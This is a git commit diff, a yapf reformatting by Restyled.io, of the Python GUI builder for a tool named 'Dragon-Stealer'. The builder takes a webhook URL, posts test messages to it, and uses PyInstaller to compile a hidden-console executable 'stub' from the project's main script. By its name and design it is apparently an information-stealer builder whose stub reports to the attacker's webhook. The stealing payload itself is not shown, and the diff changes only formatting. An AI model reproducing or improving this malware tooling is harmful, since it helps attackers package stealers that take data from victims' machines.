d419ae8a71b2cab3a18a6c609f9a73040473a425
Restyled.io <commits@restyled.io>
2023-03-22 12:48:53 +0000

    Restyled by yapf

--- wtf.py
+++ wtf.py
@@ -21,8 +21,8 @@ def test_webhook():
     webhook_url = webhook_entry.get()
     try:
         response = requests.post(
-            webhook_url, json={"content": "Webhook is working on your server."}
-        )
+            webhook_url,
+            json={"content": "Webhook is working on your server."})
         if response.status_code == 204:
             test_webhook_label.config(text="Webhook is valid", fg="#00FF00")
         else:
@@ -42,16 +42,15 @@ def build():
         file.write(data)
     # check if the webhook is valid or invalid
     try:
-        response = requests.post(
-            webhook_entry.get(), json={"content": "Webhook test message."}
-        )
+        response = requests.post(webhook_entry.get(),
+                                 json={"content": "Webhook test message."})
         if response.status_code == 204:
             messagebox.showinfo("Please wait", "Building stub...")
             os.system("pip install pyinstaller")
             os.system("pyinstaller --onefile --noconsole source/main.py")
             messagebox.showinfo(
-                "Done!", "Stub was successfully built and in a folder called dist."
-            )
+                "Done!",
+                "Stub was successfully built and in a folder called dist.")
         else:
             messagebox.showerror("Error", "Invalid webhook.")
     except Exception as e:
@@ -62,22 +61,28 @@ root = tk.Tk()
 root.geometry("600x400")
 root.title("Dragon-Stealer")
 root.configure(bg="#2D3142")
-title_label = tk.Label(
-    root, text="Dragon-Stealer", font=("Arial", 24, "bold"), bg="#2D3142", fg="#F5D042"
-)
+title_label = tk.Label(root,
+                       text="Dragon-Stealer",
+                       font=("Arial", 24, "bold"),
+                       bg="#2D3142",
+                       fg="#F5D042")
 title_label.pack(pady=(20, 10))
 webhook_frame = tk.Frame(root, bg="#2D3142")
-webhook_label = tk.Label(
-    webhook_frame, text="Webhook URL:", font=("Arial", 14), bg="#2D3142", fg="#F5D042"
-)
+webhook_label = tk.Label(webhook_frame,
+                         text="Webhook URL:",
+                         font=("Arial", 14),
+                         bg="#2D3142",
+                         fg="#F5D042")
 webhook_entry = tk.Entry(webhook_frame, width=40, font=("Arial", 14))
 webhook_label.pack(side="left", padx=10, pady=10)
 webhook_entry.pack(side="left", padx=10, pady=10)
 webhook_frame.pack()
 test_webhook_frame = tk.Frame(root, bg="#2D3142")
-test_webhook_label = tk.Label(
-    test_webhook_frame, text="", font=("Arial", 14), bg="#2D3142", fg="#F5D042"
-)
+test_webhook_label = tk.Label(test_webhook_frame,
+                              text="",
+                              font=("Arial", 14),
+                              bg="#2D3142",
+                              fg="#F5D042")
 test_webhook_label.pack(side="left", padx=10, pady=10)
 test_webhook_frame.pack(pady=(10, 0))
 button_frame = tk.Frame(root, bg="#2D3142")
